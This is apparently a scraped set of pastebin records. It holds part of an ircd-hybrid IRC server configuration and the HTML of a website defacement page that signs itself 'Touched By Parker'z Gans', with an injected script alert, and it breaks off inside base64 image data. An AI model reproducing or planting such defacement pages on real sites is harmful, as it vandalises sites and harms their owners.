servers\r\n\t * should run ntpdate\/rdate to keep clocks in sync\r\n\t *\/\r\n\tts_warn_delta = 30 seconds;\r\n\tts_max_delta = 5 minutes;\r\n\r\n\t\/* kline reason: show the user the reason why they are k\/d\/glined \r\n\t * on exit.  may give away who set k\/dline when set via tcm.\r\n\t *\/\r\n\tkline_with_reason = yes;\r\n\r\n\t\/* kline connection closed: make the users quit message on channels\r\n\t * to be \"Connection closed\", instead of the kline reason.\r\n\t *\/\r\n#\tkline_with_connection_closed = no;\r\n\r\n\t\/* warn no nline: warn opers about servers that try to connect but\r\n\t * we dont have a connect {} block for.  Twits with misconfigured \r\n\t * servers can get really annoying with this enabled.\r\n\t *\/\r\n\twarn_no_nline = yes;\r\n\r\n\t\/* stats o oper only: make stats o (opers) oper only *\/\r\n\tstats_o_oper_only=yes;\r\n\r\n\t\/* stats P oper only: make stats P (ports) oper only *\/\r\n\tstats_P_oper_only=no;\r\n\r\n\t\/* stats i oper only: make stats i (auth {}) oper only. set to:\r\n\t *     yes:    show users no auth blocks, made oper only.\r\n\t *     masked: show users first matching auth block\r\n\t *     no:     show users all auth blocks.\r\n\t *\/\r\n\tstats_i_oper_only=masked;\r\n\r\n\t\/* stats k\/K oper only: make stats k\/K (klines) oper only.  set to:\r\n\t *     yes:    show users no auth blocks, made oper only\r\n\t *     masked: show users first matching auth block\r\n\t *     no:     show users all auth blocks.\r\n\t *\/\r\n\tstats_k_oper_only=masked;\r\n                                    \r\n\t\/* caller id wait: time between notifying a +g user that somebody\r\n\t * is messaging them.\r\n\t *\/\r\n\tcaller_id_wait = 1 minute;\r\n\r\n\t\/* pace wait simple: time between use of less intensive commands\r\n\t * (HELP, remote WHOIS, WHOWAS)\r\n\t *\/\r\n\tpace_wait_simple = 1 second;\r\n\r\n\t\/* pace wait: time between more intensive commands\r\n\t * (ADMIN, INFO, LIST, LUSERS, MOTD, STATS, VERSION)\r\n\t *\/\r\n\tpace_wait = 10 seconds;\r\n\r\n\t\/* short motd: send clients a notice telling them to read the motd\r\n\t * instead of forcing a motd to clients who may simply ignore it.\r\n\t *\/\r\n\tshort_motd = no;\r\n\r\n\t\/* ping cookies: require clients to respond exactly to a ping command,\r\n\t * can help block certain types of drones and FTP PASV mode spoofing.\r\n\t *\/\r\n\tping_cookie = no;\r\n\r\n\t\/* no oper flood: increase flood limits for opers. *\/\r\n\tno_oper_flood = yes;\r\n\r\n\t\/* true no oper flood: completely eliminate flood limits for opers\r\n         * and for clients with can_flood = yes in their auth {} blocks\r\n\t *\/\r\n\ttrue_no_oper_flood = yes;\r\n\r\n\t\/* idletime: the maximum amount of time a user may idle before\r\n\t * they are disconnected\r\n\t *\/\r\n        idletime = 0;\r\n\r\n\t\/* max targets: the maximum amount of targets in a single \r\n\t * PRIVMSG\/NOTICE.  set to 999 NOT 0 for unlimited.\r\n\t *\/\r\n\tmax_targets = 4;\r\n\r\n\t\/* client flood: maximum number of lines in a clients queue before\r\n\t * they are dropped for flooding.\r\n\t *\/\r\n\tclient_flood = 20;\r\n\r\n\t\/* message locale: the default message locale if gettext() is enabled\r\n\t * and working.\r\n\t * Use \"custom\" for the (in)famous Hybrid custom messages.\r\n\t * Use \"standard\" for the compiled in defaults.\r\n\t *\/\r\n\tmessage_locale = \"standard\";\r\n\r\n\t\/* usermodes configurable: a list of usermodes for the options below\r\n\t *\r\n\t * +b - bots       - See bot and drone flooding notices\r\n\t * +c - cconn      - Client connection\/quit notices\r\n\t * +d - debug      - See debugging notices\r\n\t * +f - full       - See I: line full notices\r\n\t * +g - callerid   - Server Side Ignore\r\n\t * +i - invisible  - Not shown in NAMES or WHO unless you share a \r\n\t *                   a channel\r\n\t * +k - skill      - See server generated KILL messages\r\n\t * +l - locops     - See LOCOPS messages\r\n\t * +n - nchange    - See client nick changes\r\n\t * +r - rej        - See rejected client notices\r\n\t * +s - servnotice - See general server notices\r\n\t * +u - unauth     - See unauthorized client notices\r\n\t * +w - wallop     - See server generated WALLOPS\r\n\t * +x - external   - See remote server connection and split notices\r\n\t * +y - spy        - See LINKS, STATS, TRACE notices etc.\r\n\t * +z - operwall   - See oper generated WALLOPS\r\n\t *\/\r\n\t \r\n\t\/* oper only umodes: usermodes only opers may set *\/\r\n\toper_only_umodes = bots, cconn, debug, full, skill, nchange, \r\n                     rej, spy, external, operwall, locops, unauth;\r\n\r\n\t\/* oper umodes: default usermodes opers get when they \/oper *\/\r\n\toper_umodes = locops, servnotice, operwall, wallop;\r\n\r\n\t\/* servlink path: path to 'servlink' program used by ircd to handle\r\n\t * encrypted\/compressed server <-> server links.\r\n\t *\r\n\t * unless you move servlink around (???), you shouldn't define this.\r\n\t *\/\r\n\t#servlink_path = \"\/usr\/lib\/ircd-hybrid\/servlink\";\r\n\r\n\t\/* default cipher: default cipher to use for cryptlink when none is\r\n\t * specified in connect block.\r\n\t *\/\r\n\tdefault_cipher_preference = \"BF\/128\";\r\n\r\n\t\/* use egd: if your system does not have *random devices yet you\r\n\t * want to use OpenSSL and encrypted links, enable this.  Beware -\r\n\t * EGD is *very* CPU intensive when gathering data for its pool\r\n\t *\/\r\n\t#use_egd = yes;\r\n\r\n\t\/* egdpool path: path to EGD pool. Not necessary for OpenSSL >= 0.9.7\r\n\t * which automatically finds the path.\r\n\t *\/\r\n\t#egdpool_path = \"\/var\/run\/egd-pool\";\r\n\r\n\r\n\t\/* compression level: level of compression for compressed links between\r\n\t * servers.  \r\n\t *\r\n\t * values are between: 1 (least compression, fastest)\r\n\t *                and: 9 (most compression, slowest).\r\n\t *\/\r\n\t#compression_level = 6;\r\n\r\n\t\/* throttle time: the minimum amount of time between connections from\r\n\t * the same ip.  exempt {} blocks are excluded from this throttling.\r\n\t * Offers protection against flooders who reconnect quickly.  \r\n\t * Set to 0 to disable.\r\n\t *\/\r\n\tthrottle_time = 10;\r\n};\r\n\r\nglines {\r\n\t\/* enable: enable glines, network wide temp klines *\/\r\n\tenable = yes;\r\n\r\n\t\/*\r\n\t * duration: the amount of time a gline will remain on your\r\n\t * server before expiring\r\n\t *\/\r\n\tduration = 1 day;\r\n\r\n\t\/*\r\n\t * logging: which types of rules you want to log when triggered\r\n\t * (choose reject or block)\r\n\t *\/\r\n\tlogging = reject, block;\r\n\r\n\t\/*\r\n\t * NOTE: gline ACLs can cause a desync of glines throughout the\r\n\t * network, meaning some servers may have a gline triggered, and\r\n\t * others may not. Also, you only need insert rules for glines\r\n\t * that you want to block and\/or reject. If you want to accept and\r\n\t * propagate the gline, do NOT put a rule for it.\r\n\t *\/\r\n\r\n\t\/* user@host for rule to apply to *\/\r\n\tuser = \"god@I.still.hate.packets\";\r\n\t\/* server for rule to apply to *\/\r\n\tname = \"hades.arpa\";\r\n\r\n\t\/*\r\n\t * action: action to take when a matching gline is found. options are:\r\n\t *  reject\t- do not apply the gline locally\r\n\t *  block\t- do not propagate the gline\r\n\t *\/\r\n\taction = reject, block;\r\n\r\n\tuser = \"god@*\";\r\n\tname = \"*\";\r\n\taction = block;\r\n};\r\n\r\nmodules {\r\n\t\/* module path: paths to search for modules specified below and \r\n\t * in \/modload.\r\n\t *\/\r\n\tpath = \"\/usr\/lib\/ircd-hybrid\/modules\";\r\n\tpath = \"\/usr\/lib\/ircd-hybrid\/modules\/autoload\";\r\n\r\n\t\/* module: the name of a module to load on startup\/rehash *\/\r\n\tmodule = \"m_tburst.so\";\r\n};","file":["implemented.txt"],"host":"localhost","hostname":["localhost"],"ip":["10.0.1.0","127.0.0.1","192.168.0.0","192.169.0.1"],"key":"jA85gugN","seen_date":"2018-11-16","size":"23362","source":"pastebin","syntax":"text"},{"@category":"pastries","@timestamp":"2018-11-16T23:12:43.000Z","@type":"doc","content":"<html> <head> <h1><title>Parker'z Gans | SCA<\/title><h1><\/br><\/br> <div style=\"text-shadow: 0px 0px 10px lime;\"> <div style=\"text-shadow: 0px 0px 10px lime;\"> <script> alert(\"Touched By Parker'z Gans\") <\/script> <\/script> <\/head> \r\n<center><a\/> <meta content='Touched By Parker'z Gans' name='description'\/> <meta content='Touched By Parker'z Gans' name='keywords'\/> <meta content='Touched By Parker'z Gans' name='Abstract'\/> <\/script>  <style>    body{     background-image: url(data:image\/jpeg;base64,\/9j\/4AAQSkZJRgABAQAAAQABAAD\/2wCEAAkGBxMTEhUTExIWFRUWFhgXFxcYFxUVFRcaFRcYFxgYFxgYHSggGBolGxUXITEhJSkrLi4uFx8zODMtNygtLisBCgoKDg0OGxAQGi0lHyUtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLf\/AABEIAOEA4QMBEQACEQEDEQH\/xAAcAAABBQEBAQAAAAAAAAAAAAAEAQIDBQYHAAj\/xABOEAACAQIDAwkEBgcECQIHAAABAhEAAwQSIQUxQQYTIlFhcYGRoTKxwfAjUnKy0eEUM0JigpKiBxU0U0Njc3Sjs8LS8ZPTFiQ1RFSDlP\/EABsBAAIDAQEBAAAAAAAAAAAAAAACAQMEBQYH\/8QANREAAgEDAwIEAwcEAgMAAAAAAAECAwQREiExBUETIjJRM2FxBhSBobHR8CORwfFC4TQ1Uv\/aAAwDAQACEQMRAD8A7Ei1IEyigCQLQAjJQAPct0AB3bNAAd2zUADXLdBJCVoDIgSoJFyUAKFoAi2hi1tW2dtABNCJycyxO1OcuNcYnU6DqHAChkrYbj8WMoURmP8ASO3tqEM2UtyywkiYPHj1zRklRyO2ZcIOpnhr1dRneKGQlhliuOCkz48ezxEVGAYHj8bqdZEQR1jfPb1zTIgonuEMeo1JWKtzt\/8AFBITh9dDpNI2WxWTXf2f7VKXuZY9F9I6m4Hx3VK3EkjpLUCmaxmMuM0hZ6l19O2mQMvNkYNyuvEyeoTFSxQ0YVur1HHdUEg+IsHokqCszPUYkaeNQ+SewdloFL9KYCZKAJhQB40AROtAEFxKABLqUEgd1KgAZ0oAREoJFyVAHitAGA\/tI2vBXDqRwd\/+ke80yBGDGIEzMx6moY3IiFiY1J\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\/11JR\/5lINNqaBxTAn5OrdBDPcZNxD3LjL\/IWyk9pBo8SXYhU49zW4DDqlsW7ahQAAANAAOAqFFsWfOXwZHli4t4nBXmOiXXtsepbqESewECrqb2aIqrhoO2lskOJG\/iKVZRGzM5tDZhCmJ7qlTSBwyZLGYOJJrTGpkzVKBS4q6M2nVrVqMz9j2Hv5WHVAPlH4UyILm1di\/wDayt\/MI+BolwNHk6ByQb6Un933k0kOSa3BrrOoq0zMlAoAixVxRAYxJAETqd\/wNAEuz8dbuXHRLis1vR1DAlCRMMBuNIkM+wVNAxwxNq41d166O68\/41q0FASnKfaK7r93xKt94Go0InPzCLfLbaS\/6Vj327R\/6ajw0GQpP7Sccntc2w6jbgmOEgiodNE5Z2G3dDAMNxAI7jqKqHHzQQNoJEJoAYTQA+yaCAXlEmbC3xvm1cH9BoA4ByOuD+8LPaXH\/Cf8Kqrehmml8RHVbjRXOOpEZbk60uRsjMZduJGU6Tr+VPFoHgLsbcCrmLbt\/wAirEsCPfsD7Ua3iLMrDmQRuI6mHipYHvpeBu2GV+HxeKswEQXUGnNuSrqOpLkEEdjedWJqXJTolH0j8fyhQoQ2Hv23P1rRdR\/HbzLR4fsyFP8A+kzB7dxqx0QT3qyj+oCracMciVamVhIxl28c87yd9aVwc5vcl5zdQgbLoXOlaP7o9CaGOuTpXI09N\/sD30sSanCNraGgFWmckioAFxuB5woc7LkYNpHS7D6+ZqCSfZeAtW7l10tqrXOk5AALHdLdZpIjSDuZFTgMnCM9bijAoepAXPQQDbQHRnqP5VElsSjs3InGc5gcO0yRbCHvt9A+q1jfJd2LyaAPZqAEJoAYTUE4JcPvqSD2Nt5rbr1ow8wRUgfMezMVzOItXDpkdSe6Yb+kmq5bpovi8STOyXn0rmM6a4KobUu2WOa0XU+yV3jrBFMoKS2JSJsNyow9whXRk7SZg9o3x20eC4su0ZLLZS2mZspRp1ge+DUYYk44Le1aQblA7hFAuTz5RwFCYJFdj7wAMVORsHJeWeM6R1rVQWTHc1MLBi2u9R7\/AMq1HMJsLOnVNSCLxGJFvsB94pcFp1DkUOm3+zH31\/ClgNU4RuVq0zjb19UEswUdZqABhtNS4RYM6ngdTGg8qAAeS+2WvYzF29yWUtADT2ma5LT2hV07KVLCyS35sGoqAPn\/ADVvKx60EDwaCCLF6oR2VBK5Oi\/2SY3NhHQ\/6O6Y7nVW+8XrLJPJdF7bmwu7QtrvbyqyNvUfYR1oLuMXalsnKCxMT0Udo7yoMeNV1KbhtIeEtazEJFwETPw9DVeUPhiE0Iglw51piGEE1JB8u7dsBLt1d4W46z15WIn0qvJe47I6pyfZmw9rnPbFtQ3aQAJrnzeW8HRgmkkybFKYpU8FkXgqmv2H6N62AesCrlJGqNRCnZlvQ2L7ow1A3rPfvFTmPcSp7lxhNqYjRbtodRcMIPbG+qZJdjM+Q1rhO+qxkVe2cUEtknSnjHLBywsnEdvbR566SPZnSulTjpRx61TXIrgacpLPCjQd80EovMNb1tjs95oLO503kZpcYf6ufJh+NJAetwberTOMu2wwhgGHURIoArjshOdW6AFK8FAAMbp0nT4Ur2JRLyf2Qtm9iLqn9dzcrG4pnJMzrJuHypU8omXJeTQBwEVuKh81KDAmapICdnYB79wW0gTvJ3Ko3sfPdxJFTGLbwK2luzb7MwdrCW+atTwzOdWdutiPcNBNbaduluYqlxqeD2JxelXKBU55LXk5ipR9dc0+YH4GvNdZi41U\/keh6S9VHHzLI3T11x9TR1NKG\/pBXuqxV5ruI6MHyiZcaeFT95qe5X93h7Db+ILCDrSSrzfcsVGC7HNtq8mVOJdv2S2YCNOE+oNWxrPTgHCJolTKqxwFV5GDEZSJJqWhkPOz7F0dJQT1jQ+YoyWAp2aqHSoyI0K2lBAHtPbFuyhe4wUCnjFy2REpKKyzk3KvlY2JORJW36t39QrfSoqG75OZXuXPZcGXirzKOUVAFtg0mBQMjR4G39KOwJ6xpUdi1Lc3\/JJvpz9hvv8A5CkpjVVsbgmrjMeDVACM+lLIlckmBOh7\/wAKWPAz5CZqSDheCwr3WyW1zNExIGg4yxA4itU6kY7yFUXLgfjsBctEC6hQkSNVMjvUkVNOpGfBEouPIKatW4jNjycw\/NWMx9q70u0KPYHvP8Q6q229PG5huJ9iV8RJInq9JrakYskTEmfnxoAseSt76Rl61B\/lP51w+t0s04z9jt9Gq4lKJo30rzGk9DkRlmlJ5IsOupU8N3dUICW6IqAKjGJJk08CGR71piCtxBZTofCrIyJHYPaBTep8NaZ4ZOphWI20saKx8I99LpIcik2jtd4MADv1NPGCZW5tHMuU+0GuNBYnv+dK3Uo4Rz69RvYowKtMwoSpAnFmoGSLnZqST3fMUrLIrc0GEYc60fXRR4QPnupW9ixcm55ND6de1H94PxpKT3GrLY2AetBkPTQQeO6llwSuSfAHQ99KuBnyETUkGe2FsGzYEIuu4sZLHvMdh0GlZZylN+ZmuOI7IM2psS1fTLcWY3bwyyBqDGm8eVEJOm8xIliXJy3a+yWsYxMMekrwyvulNS0jgwCn06661tU8XHuYasdGWaS\/e4dpHYI0+FdyEcI4lR+YBDHMePu3VdFFUuwSvAGla3JUkLhL4tXUfqOvcdD36Gay3lLxaMomqyq+FWjI2T614prDPY5yNzFe6laBMnKTDDfVMkWiPqO2lW5BVYpKZEAlkyTTkEVxATToBVsigghu2KnJBj+UuLiQK0UkVVGc8xALOT1Vtic2e7IgNewCmEJsMk6xUMlLJLfXUCoRY12Lvk6nSU8JFK+B4IsdlasT13V+8x\/CklwWxRuOTZIvWjwIZfNFNJS2kTWWYmzNajEeBqAHCllwSuSfB+ye8+81C4B8k81IFRYu6aHr4D6vf31myaiS5dOv5fVjr7RSgZPbd5Hv5wQTZU25EGGuFWZYG4gKn89dnpdN7yZzeoVMYRWXLswessRHY50rvwXlOLN+YbYb2td7aeS00RKnYJQePlNS0QJfjQju8aVoZM1HJ\/Fc5bAPtJCn4H09DXkOqW\/hVsrh7nren1\/FpL3WxbPbkVzDcB4DEwSh3ikwPkLdeIqqSwODYizOvnQmK0AJY6TU+SAK97VWICRBUkFbtjHZRlXfTRRDMBtiTM7zWqJnqGXvaDtMmtK4MM+QeNPGmKw\/A29w+eulY8UJiBqTUDsu9gr0V7\/hNLIshwHbJHsn99fTX8arky2KNpydc5k\/dZB5qfnwpIepBU9LNsRWswnooAVaV8ErkJwvs+J99C4AlmgCkwPJprYhb93KNADkMDvKz61S4pl6kwt9gFhBv3BO+CinzyyPCoUEDmzAY6zatXuYsCLauZlixZiekxZiSSTXp7SlopLJwrio51GwO1c+jQ\/aH9bVvhwzDUXmJ8CeidD7XwH40RCo8YCQI8aZla4H5Afw4aVDJiS7IxvM3Ax9k6N3fiN9c\/qFr49LC5XB0bC68Crvw+TcgggEag7j1zXi5ZTwz1q3WUV+Lw2uYb6UcIsueNDWSUSGKrxgbIKyRNTEVg1zCzVnAiIcRbyrpvNQtySgx2GgFjvp0yGYrb4gH58q1UtyirsjJXtWrWjny5IrY1qWIHWHiaVlsR91dBUEsutl24tgcck+ciq2y+K7Fls5AFT7Y9TVUi2OyNTsUgXG77fvYfhSx5QT4Ztya2nOPA1ADlqHwSgnDez4moBj5qQKU8pLQMG6hP7iu\/8AVuNJgbUS29tKy3GUkhUJkiNdANI7eurqFPXUjESrPTBs5xhnzX\/EmvTtYRwluRtpZJn2XYes\/GrocMqmvMg3ZXsEiNW4nsGtREioFOxnT\/z+VNIREkadvzuoFaB7y699QxkaLkttOfoG3j2D1jeV7xv7p6q8v1mx0vx4cdz0\/SbzWvClyuDQnWvP5O4Ny1JAw1HJIy8NNI8d1SthZLIz8PWozkN0Q4i2TTIjBVY3BEgzQSjnPLNQpCjj8dT6D1rZQKLlrBkCOl4VsOZLkQjWpyKPzUvct7BNgZm7AsnxIA9T6Ur4JW7L+wsMqj6qqfEiqZcGqK3LbYo+jUng6k+BM+8Uj5HRc4YnnH7OaPfF8g+gqI9gn3NwDpW05rPZqAJLTa0siUFWD0B88KAFzUAc5sWwBSZGaGptObV5QCALmSesqoLR2AkDwNdfptFuTmzm3tTCUPcrNjibhPVNdiSMPYjvH6K8P3iT\/KB8KsXcqfMQvky4NmdfaPoFpYPI1ZYZYB9d+lPIogOzcBu31KIfsOaD5bjUYJWwOJDAgww1B4yN2tVzhGScZcFsJyhJSi90bDY+0xeWJAuAdIf9Q7Pca8X1CwlbT29L4Z7GyvY3EPn3LIisGDayNlowQeBqGSIxoUQyQ3DTildtDEQpqUgOQ8qsXnvHsn+rf6AVuoQ2MVzPcz1xtfCtM46Xgwp53PXTupSUI2+KgtD9mj2m7fujT1NJJ9h4Iu8Pcg5uqD5AH4VUy9MvsGIDL\/rBB7M6\/hVLLEGLdi+wP1XjvS5PxFSvSmE93g6Xh9nF0V0dSrCQddR5VqU1g57i8jjse51r5n8KNaI0sVdk3BxXzP4VDmmSosmtbOcKBI8\/yo1hpYv93v2ef5Ua0GlnOEt1CJYDtbKoIEDieok7yfH3V6uzo+HSSZ5+5qa6rAtgj2jvEGr8CshvDo3x1gGPMUwvsS8kSThyeq433Vquk9x7hF1EirZMzQQp7KEQ+RX4TUgIygx8\/IpSeCBC1tsymHUyCKqq041IuE1lMvo1pUpKUdmjW7G26l2FaFudXA\/Z\/CvJX3TJ271R3ieqsuowrrEtpFwVrmHRI2SgCJ0qSGQ3EoFMlyv2qltCJljIArbbWk6u\/Yor3Eae3c5NibhdiTvJroQp4eEcyc3J5YBiTBNRV5ZEeBqtrVQ6CWHS8aQsDsC021HWT6k0r2HjwWy7nH7hjwEe6T4VWX+5pEOa2GGhcSftc2Lkf1elUzWHgenvEjxFyLwI4l1\/nhh92oW8Rpeo0v8AZ\/yr5m+cLdb6NychO5Wk6eMenneouOzMtRat0dXyjwqCoXLQyRwWoDIuUUBlnMMbhEtW85djrABtsknvb8K3WVDxqiXZGW6q+HDPcxW0rpafkV6vhHBju8hOwVhSOykHkD4n2rgP+U3nINSwjwe5I\/4bX\/Mb3KPhVVJllyuC7PD3VbIyxQi3OHyO6pBk8yOv59KkU8yyIj8ahMbkRxO\/hUEgly388dPfUYysMM4exa7N5RXbQh\/pF7faHjx8fOuTc9HpVXqh5X+R17bq9SmsVFlfmW9vlRhyOkWXvUn7s1yZ9FuU9sP8TqQ6vbyW7wJc5UYUbnZuwI3xioj0a6fKX9yZdWtkufyKDavKlnBFpcva2+unb9CUXmq8\/JGCv1ltYpL8WYjbLEyzEk9tdKvCMIaYrCMdCpKc9UnlmeC1y6cdm2bpFTiGljWObyyxEuGEsPD31W+B48hC7ye\/1pSxFjscapP1p8j+VJPgsp8hVhjJO\/2vdqKTG5at8mh2Y84bf7JGnHoswMfwXbY8KSryTRfYbd9pTOoKH0E+pquL2LZrcdyqweRhcGk8eozIPYZM+ddu5t1oU17HIoVvM4v3On8huUz4jDgMwNxOi26dOPjFctI0zWDQHaTDq8qnCFyNO1X7PKjSiMnv72f93yP40YQZOQcpv7RMNfKLbF5gsyxRFGsagZp4cRXVsKyoZ1LkxXdF1saXwUn6dbuaq+vUZU+tdiN3SnwznfdqkHui+2OvRJ7N9W53KpLYDvL0\/tAj37qaTCBbciLDJhrZQhbl3EC0jETzYd3BbURmOSB2E7prz9\/cvPhxffc9Z0ixpycq1aOYxi2l74NBjsHm5zPcthrTW5vEc2HtX1zWy6qD0wQFkCelrumotb10sxqPKQl\/0uFz4VW0hhzT2+a5AsRstkQvzlpwAGOS4rkK5hWI6ieOu8TXVo3tKrLTHk4Fz064oR1VI4WcfiCIOv0rZk5+DxaDpR2JS3LPaWDVTdFvNNlratmynNzikhlIAjVSCpHEa1zLS+dao6ckdnqHS\/u1vTrxllS7e2CseYkflXSzh4OPhtEGQNpuO+nwVgtzBk\/P504uSBrUb9KklMiY9591GCU0VO0LRaZ4HcN1Y7jg6NtsUl9YVj2RXNm1GDN63aKG4Na5bLifDDpdyz6VDexbHkIC6Du+ffSMZFlgFjLHb6b\/AI1XMupodhbmr98+uvpRjcePcveT7\/RX7Z3q2Zfsvlzf1KlJcLDCgz2PuxBH1BPqPnuqmBfNGi5Q2hcsieOWCN8kCvXQiqlCP0PMSbp15FZyMxpw+KVSeiTzb+fRPu9K87Wj4dRo7MHrpnS7uIlcytIMwQZFD+RUgt7iqCWB03xJ8dN1NgjIF\/fNjrb0\/GoJwYDEFU+itW1L+yzBVDSACETgp11OuVRrJIrpJLlmV\/IKRFtLlAUn9tyMu8ZsoJnIN5nUiJMlswXGWSMwdzPbzgQGYxpByqcskcJg+fievapqO5zLlpy2AMQemN9aGyqCNfydNkYRLN18kvmRwQuW4pJBltATluDWB0Ykb68vdY8WSl7nsunqtGlGpRWrEcNe64f+CW2vPtfLvzqNicKhcDIHVXZdANBpG7rFZF5m8+6OxUl92hT0R0tQm8c4bQdsOynP3SqKqvh7N4KB0VYm0+gPAPuHdVqXh1ZJHOuK0rixoyqbvVh5BQLb4b9IvKS2Tpc3ltknnimeAMuYKV4a8eutVG+qU6Kec7mO66PSq9QlQh5Vjb+2QW\/sducuIgkKQM5K2wcwDLqzAZoO4E111ew8NSk8Z7Hm\/uVR1HCCbx7Bm0kh8d9qx7o+Ncnp\/wD5L\/nY9H1n\/wBZQX1\/U9sbEFLdtQYFzFqjCJDqUEqwOhBk1d1WTjVi1\/OTJ0GhCrRralnEWzP7QshXaNIYgeBiu7RlmKz7HmaqxJkCtJ6Wh7N3pVuCoV7PbUi4IWs6cKhssiitxljTQVnqLKNlF7mW2iP2e2TXIuV5TqU92UN63v8AnjXObL+CS0vtdwHupGyxIMvLBAHUPhS\/MdBirBC9aMB30j3LVthENkw57RPrFD4JXJabIuZcTE6OMp7iunqB5VFbzRCntMMxKzI6gfQ6fPbWeJpZqcFL27bH2UQR2sNPIRXrenvVbx+R5e\/8tdpdzNYuyRdZuJ6XiNa5HUoJTbOpYyzFI0WyllZtu6E9NrYYhWnQkCYEkQfzmqqUYyimFbKkwTa\/KHHIZW\/KGf2LenAhoUGJMcN8b9+mNOLRS20N\/wDjk\/8A4Vv\/ANa5+FL93ZHiBmGtiyIj6Qrqf2ba6kxO4TJkmWIk6KStjer6ELYpdtY2TzY3A9LfMzMGe2CR9btBJ0U443ZVN5Dtk40NbCTDIIjrHXXRt5JrBgrxaeewzEb5FXyKol\/sbHW7dorcUZSVGZkFxBmLsouJvy5i3SUyC\/HceF1FQhNTmtnsz0\/R43NeEoW88Tjut8ZzyizxDXoCnIiMPoGTKMPnR0uoQy6am3BJ111gCoqUqM6H9Dnn5iWt1WpXub3O6aefnsM2ZtK9axFx71j\/AESi4iRFu30MhWCRlEJxOhrkKc1NuS+p6itaW1S1p06E9s+Vvu++R2EcNs64MyyisCJE9K7ZZNN5Bh9eymjNeA0JVpyj1aE8bNf4aC9uYMXv0VScqurXXIEmEw9ksQOJhIp5Jz0RM1jWVmrmqlunj82M5P7PRHxdi6SVBtqCDlzEt9HrBygkr1xNNaOdOq3HlC9cqQubWjUlspZJWwoVcMVDBWxdthmjMNArKxGhIZWXwq28rutpk+f9mXpVt92dxTTytD\/Ez+Ob6R+PTb3mvUUvhr6I8NV9b+oJdTs19atRWxLdzhuNSyMEjCdZ+HpUcDIAxa6SeFVzL6fsZPaVmBPZXLuODrUXkor1rUjsnyrjs2JbjMukfWZR5ikZYWL2punqFJ2HS8wXjbZXmm7J\/qilQ77MhvW4huEnyn4TUL2HfuTYU6q3FRM\/ZP5mrVHVCWBG8STLfEkC+V4MAPAjT3isUVtk1Pkv9l3pwyDiMwH